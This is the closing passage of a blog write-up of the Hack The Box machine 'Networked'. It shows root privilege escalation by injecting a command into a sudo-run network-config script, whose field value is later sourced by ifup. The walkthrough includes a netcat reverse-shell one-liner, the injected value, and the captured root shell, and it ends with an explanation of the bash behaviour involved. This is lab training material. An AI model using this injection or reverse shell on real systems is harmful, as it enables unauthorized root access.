</pre></table></code></div></div><p>Looks like something went wrong? According to <code class="language-plaintext highlighter-rouge">changename.sh</code>, it was reading values for different fields like <code class="language-plaintext highlighter-rouge">NAME</code>, <code class="language-plaintext highlighter-rouge">PROXY_METHOD</code> etc and writing them into <code class="language-plaintext highlighter-rouge">/etc/sysconfig/network-scripts/ifcfg-guly</code> in the given format <code class="language-plaintext highlighter-rouge">FIELD=VALUE</code>.</p><p><code class="language-plaintext highlighter-rouge">/etc/sysconfig/network-scripts/ifcfg-guly</code>:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=test
PROXY_METHOD=test
BROWSER_ONLY=test
BOOTPROTO=test
</pre></table></code></div></div><p>I wasn’t sure how we can inject commands using this script but as I was fuzzing with different values, I saw a new error.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/sbin/changename.sh
<span class="nb">sudo</span> /usr/local/sbin/changename.sh
interface NAME:
a a
a a
...
/etc/sysconfig/network-scripts/ifcfg-guly: line 4: a: <span class="nb">command </span>not found
...
ERROR     : <span class="o">[</span>/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
</pre></table></code></div></div><p>Our input is being executed ? Lets try to rerun it but insert a command instead.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">[</span>guly@networked ~]<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/sbin/changename.sh
<span class="nb">sudo</span> /usr/local/sbin/changename.sh
interface NAME:
a <span class="nb">whoami</span>
...
root
...
ERROR     : <span class="o">[</span>/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
</pre></table></code></div></div><p>Nice! Now we know where to inject our commands, we proceed to establish our reverse shell connection. However, since our input cannot contain periods (.), we can create a script that contains our reverse shell commands and execute it instead.</p><p>On my machine, we start another listener.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 1339
listening on <span class="o">[</span>any] 1339 ...
</pre></table></code></div></div><p>Then, on the <code class="language-plaintext highlighter-rouge">Networked</code> machine,</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">[</span>guly@networked /tmp]<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"rm /tmp/g;mkfifo /tmp/g;cat /tmp/g|/bin/sh -i 2&gt;&amp;1|nc 10.10.XXX.XXX 1339 &gt;/tmp/g"</span> <span class="o">&gt;</span> runme
<span class="o">[</span>guly@networked /tmp]<span class="nv">$ </span><span class="nb">chmod </span>777 runme
<span class="o">[</span>guly@networked /tmp]<span class="nv">$ </span><span class="nb">sudo</span> /usr/local/sbin/changename.sh
<span class="nb">sudo</span> /usr/local/sbin/changename.sh
interface NAME:
a /tmp/runme
...
ERROR     : <span class="o">[</span>/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
</pre></table></code></div></div><h1 id="roottxt">root.txt</h1><p>Back on our machine, we caught the reverse shell connection.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>connect to <span class="o">[</span>10.10.XXX.XXX] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.146] 51618
sh: no job control <span class="k">in </span>this shell
sh-4.2# <span class="nb">whoami
whoami
</span>root
sh-4.2# <span class="nb">cat</span> /root/root.txt
0a8eXXXXXXXXXXXXXXXXXXXXXXXXXXXX
</pre></table></code></div></div><h3 id="rooted--thank-you-for-reading-and-look-forward-for-more-writeups-and-articles-">Rooted ! Thank you for reading and look forward for more writeups and articles !</h3><h1 id="extras">Extras</h1><p>I went on to study how was <code class="language-plaintext highlighter-rouge">/etc/sysconfig/network-scripts/ifcfg-guly</code> was being used when <code class="language-plaintext highlighter-rouge">/sbin/ifup guly0</code> was executed and it actually explains why commands can be injected.</p><p><code class="language-plaintext highlighter-rouge">/sbin/ifup guly0</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
...
<span class="nb">cd</span> /etc/sysconfig/network-scripts
<span class="nb">.</span> ./network-functions
...
<span class="nv">CONFIG</span><span class="o">=</span><span class="k">${</span><span class="nv">1</span><span class="k">}</span>
...
source_config
...
</pre></table></code></div></div><p>There was one line which was calling <code class="language-plaintext highlighter-rouge">source_config</code>, which is a function imported from <code class="language-plaintext highlighter-rouge">/etc/sysconfig/network-scripts/network-functions</code>. How was the function imported? This is where I also learnt that <code class="language-plaintext highlighter-rouge">. &lt;command&gt;</code> is actually the same as <code class="language-plaintext highlighter-rouge">source &lt;command&gt;</code>, which reads and execute commands in the <code class="language-plaintext highlighter-rouge">&lt;command&gt;</code> file, essentially importing the functions in there too.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>source_config <span class="o">()</span>
<span class="o">{</span>
    <span class="nv">CONFIG</span><span class="o">=</span><span class="k">${</span><span class="nv">CONFIG</span><span class="p">##*/</span><span class="k">}</span>
    ...
    <span class="nb">.</span> /etc/sysconfig/network-scripts/<span class="nv">$CONFIG</span>
    ...
<span class="o">}</span>
</pre></table></code></div></div><p>In <code class="language-plaintext highlighter-rouge">source_config</code>, the corresponding config file (<code class="language-plaintext highlighter-rouge">ifcfg-guly</code>) in <code class="language-plaintext highlighter-rouge">/etc/sysconfig/network-scripts</code> is imported, which calls all the variable assignments lines and this is where commands can be injected into.</p><p>When <code class="language-plaintext highlighter-rouge">VAR=VALUE</code> is executed, you are assigning <code class="language-plaintext highlighter-rouge">VALUE</code> to <code class="language-plaintext highlighter-rouge">VAR</code> to the shell. However, when <code class="language-plaintext highlighter-rouge">VAR=VALUE &lt;command&gt;</code> is executed, <code class="language-plaintext highlighter-rouge">VALUE</code> is assigned to <code class="language-plaintext highlighter-rouge">VAR</code> only in the environment context of the <code class="language-plaintext highlighter-rouge">&lt;command&gt;</code> and the <code class="language-plaintext highlighter-rouge">&lt;command&gt;</code> is executed!</p><p>So when we injected our command, it will be saved as <code class="language-plaintext highlighter-rouge">NAME=a /tmp/runme</code>, which result in <code class="language-plaintext highlighter-rouge">/tmp/runme</code> being ran!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/bash/" class="post-tag no-text-decoration" >bash</a> <a href="/tags/php/" class="post-tag no-text-decoration" >php</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack The Box - Networked - rizemon's blog&url=https://rizemon.github.io/posts/networked-htb/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack The Box - Networked - rizemon's blog&u=https://rizemon.github.io/posts/networked-htb/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Networked - rizemon's blog&url=https://rizemon.github.io/posts/networked-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/magic-htb/"><div class="card-body"> <span class="timeago small" > Aug 23, 2020 <i class="unloaded">2020-08-23T00:38:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Magic</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/nibbles-htb/"><div class="card-body"> <span class="timeago small" > Jan 9, 2021 <i class="unloaded">2021-01-09T22:56:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Nibbles (Without Metasploit)</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/poison-htb/"><div class="card-body"> <span class="timeago small" > Jan 19, 2021 <i class="unloaded">2021-01-19T19:29:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Poison (Without Metasploit)</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/haystack-htb/" class="btn btn-outline-primary"><p>Hack The Box - Haystack</p></a> <a href="/posts/heist-htb/" class="btn btn-outline-primary"><p>Hack The Box - Heist</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
